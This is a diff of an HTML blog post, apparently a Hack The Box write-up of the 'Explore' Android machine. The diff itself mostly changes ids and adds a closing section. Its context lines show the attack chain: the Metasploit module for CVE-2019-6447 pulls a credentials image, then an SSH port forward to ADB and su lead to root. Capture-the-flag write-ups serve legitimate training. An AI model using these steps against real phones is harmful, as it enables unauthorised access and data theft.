@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-10-31 Mon 22:34 -->
+<!-- 2022-11-01 Tue 12:42 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | Explore</title>
@@ -55,6 +55,7 @@
 <li><a href="#org20abcaa">3.2. Getting access</a></li>
 </ul>
 </li>
+<li><a href="#orgfbfe4cc">4. Final words</a></li>
 </ul>
 </div>
 </nav>
@@ -81,7 +82,7 @@ And we'll quickly find that this isn't a normal box, this is an android phone!<b
 <p>
 The result from <code>nmap</code> isn't really that useful as it is filled with a lot of noise.<br>
 </p>
-<pre class="example" id="org7d525c0">
+<pre class="example" id="org6e6bff7">
 # Nmap 7.91 scan initiated Mon Jul 26 23:11:21 2021 as: nmap -sC -sV -p- -oA nmap/all_ports -v 10.129.161.205
 Nmap scan report for 10.129.161.205
 Host is up (0.032s latency).
@@ -280,7 +281,7 @@ We can use the vulnerability to read files on the machine, and hopefully find so
 Metasploit has a handy module for exploiting CVE-2019-6447, that we can use for enumerating all kinds of things on the machine.<br>
 We can start by looking at installed apps:<br>
 </p>
-<pre class="example" id="org73d8fa8">
+<pre class="example" id="org9aef00c">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTAPPS
 ACTION =&gt; LISTAPPS
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
@@ -303,7 +304,7 @@ This more or less just confirmed the findings from the <code>nmap</code> scan.<b
 <p>
 We can also look at pictures on the phone:<br>
 </p>
-<pre class="example" id="org51eb3e6">
+<pre class="example" id="orgc159540">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTPICS
 ACTION =&gt; LISTPICS
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
@@ -325,7 +326,7 @@ Which proved quite promising with the <code>creds.jpg</code> pricture!<br>
 <p>
 So let's download <code>creds.jpg</code> and get those juicy secrets<br>
 </p>
-<pre class="example" id="org1eb5aea">
+<pre class="example" id="orgdd04a08">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION GETFILE
 ACTION =&gt; GETFILE
 sf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
@@ -356,7 +357,7 @@ We can now login with using ssh and get a shell!<br>
 <p>
 Now that we have credentials, we can just connect through ssh and get user flag!<br>
 </p>
-<pre class="example" id="orga8ecda6">
+<pre class="example" id="org7ebc104">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ ssh explore.htb                                               
 Password authentication
@@ -392,7 +393,7 @@ f32017174c7c7e8f50c6da52891ae250
 <p>
 Next thing we can do tunnel the port to get a connection to the <code>freeciv</code> port which is meant for Android Debugging Bridge.<br>
 </p>
-<pre class="example" id="org2c176ec">
+<pre class="example" id="org279af0c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ ssh explore.htb -L 5555:127.0.0.1:5555 
 Password authentication
@@ -411,7 +412,7 @@ $ adb connect 127.0.0.1:5555
 <p>
 And the use <code>adb shell</code> to get a basic shell, that we can upgrade to root using <code>su</code><br>
 </p>
-<pre class="example" id="org3c0be4b">
+<pre class="example" id="org2c94ae2">
 
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ adb shell                                                     1:12
@@ -422,7 +423,7 @@ x86_64:/ $ su
 <p>
 And then finally get the root flag<br>
 </p>
-<pre class="example" id="orgef54ed0">
+<pre class="example" id="org2f586d1">
 1|:/ # ls data
 adb           bootchart     media       property       tombstones
 anr           cache         mediadrm    resource-cache user
@@ -437,6 +438,15 @@ backup        lost+found    ota_package system_de
 f04fc82b6d49b41c9b08982be59338c5
 </pre>
 </div>
+</div>
+</div>
+<div id="outline-container-orgfbfe4cc" class="outline-2">
+<h2 id="orgfbfe4cc"><span class="section-number-2">4.</span> Final words</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Thank you for taking some time out of your day to read this post.<br>
+If you enjoyed this post, feel free to join my <a href="https://discord.gg/t8tKrgdGWu">Discord server</a> to get notification whenever I post something and ask questions if there are any.<br>
+</p>
 </div>
 </div>
 </div>
